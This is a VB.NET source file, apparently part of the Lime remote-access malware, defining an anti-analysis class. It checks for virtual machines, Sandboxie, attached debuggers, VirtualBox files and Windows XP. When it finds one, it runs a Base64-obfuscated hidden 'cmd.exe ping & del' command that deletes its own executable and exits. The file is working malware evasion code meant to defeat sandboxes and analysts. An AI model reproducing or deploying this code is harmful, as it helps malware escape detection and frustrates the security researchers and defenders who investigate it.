Namespace Lime

    Public Class C_AntiVM

        <Runtime.InteropServices.DllImport("kernel32.dll")>
        Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
        End Function

        Public Shared Sub Check() 'https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/
            Try
                If DetectVirtualMachine() Then
                    GoTo del

                ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
                    GoTo del

                ElseIf LoadLibrary("SbieDll.dll") = True Then
                    GoTo del

                ElseIf Diagnostics.Debugger.IsLogging OrElse Diagnostics.Debugger.IsAttached Then
                    GoTo del

                ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxhook.dll") Then
                    GoTo del

                End If
                Exit Sub
del:
                'cmd.exe /c ping 0 -n 2 & del 
                Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & Windows.Forms.Application.ExecutablePath & """", AppWinStyle.Hide, False, -1)
                End

            Catch ex As Exception
            End Try

        End Sub

        Private Shared Function DetectVirtualMachine() As Boolean
            Try
                Using searcher = New Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem")
                    Using items = searcher.[Get]()

                        For Each item In items
                            Dim manufacturer As String = item("Manufacturer").ToString().ToLower()

                            If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
                                Return True
                            End If
                        Next
                    End Using
                End Using
            Catch ex As Exception
            End Try
            Return False
        End Function
    End Class

End Namespace
